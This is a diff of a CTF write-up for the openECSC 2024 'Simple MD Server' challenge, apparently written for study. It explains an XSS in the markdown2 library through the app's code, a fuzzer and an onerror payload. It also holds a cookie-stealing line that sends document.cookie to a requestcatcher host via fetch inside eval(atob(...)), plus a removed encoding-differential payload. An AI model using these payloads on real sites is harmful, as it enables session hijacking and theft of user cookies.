@@ -1,10 +1,13 @@
 #md #xss #fuzzer #charset 
 # ecsc24 - Simple MD Server
+
 ## Description
 Yes, another markdown editor, but this time we keep it simple!
 Site: [http://simplemdserver.challs.open.ecsc2024.it:47008](http://simplemdserver.challs.open.ecsc2024.it:47008)
+
 ## Overview
-Classic notes app, supports **markdown**.
+Classic notes app, supports markdown.
+
 ## Road to flag
 The flag is inside admin bot's cookies:
 ```js
@@ -32,7 +35,42 @@ r = requests.post(
 ```
 -> XSS
 
-## Exploit (unintended solution)
+## Code review
+The app is really simple, uses python's socketserver and [markdown2](https://github.com/trentm/python-markdown2).
+This is the main logic: `/preview` renders the given markdown.
+```python
+def markdown(self):
+        query = urllib.parse.urlparse(self.path).query
+        data = urllib.parse.parse_qs(query).get("x", [""])[0]
+
+        # Convert markdown to HTML
+        data = markdown2.markdown(data, safe_mode="escape")
+
+        # Send response
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(bytes(f"{data}", "utf-8"))
+
+    def do_GET(self):
+        try:
+            url = urllib.parse.urlparse(self.path)
+
+            # Some kind of routing
+            if url.path == "/":
+                return self.static_page("index")
+            elif url.path in ["/list", "/new", "/report"]:
+                return self.static_page(url.path[1:])
+            elif url.path == "/preview":
+                return self.markdown()
+            elif url.path == "/get":
+                return self.get_document()
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(bytes("<h1>Not Found</h1>", "utf-8"))
+```
+
+## Exploit
 I just fuzzed the markdown parser:
 ```python
 import markdown2
@@ -87,11 +125,12 @@ def start_fuzzing():
 if __name__ == "__main__":
     start_fuzzing()
 ```
-And came up with a payload that triggers xss:
+And came up with:
 ```
 ![](`" onerror=alert()//`)
 ```
 Why this works? The library inserts code blocks into img `src` attribute, and does not escape quotes in `code` blocks.
+https://github.com/trentm/python-markdown2/issues/603#issuecomment-2369068844
 
 `openECSC{K33P_I7_51Mple____?}`
 
@@ -99,10 +138,6 @@ Why this works? The library inserts code blocks into img `src` attribute, and do
 #### Intended solution
 The intended solution leverages [encoding differentials](<TL;DR: https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/>)
 ```
-payload = URL + '/preview?x=aaa%1B(Baaaaa' + 'a%1B$@!2%1B(B' * 200 + f'''aaaaa%1B(B ![img%1B$@!](file://a)%1B(B ![red]( onerror=location.assign('{hook_url}?'%26%2343;document.cookie) )wwwww'''
-
-// or
-
 JS = "fetch('https://pwn.requestcatcher.com/pwn?' + document.cookie); while(1);"
 JS = f"eval(atob('{base64.b64encode(JS.encode()).decode()}'))"
 
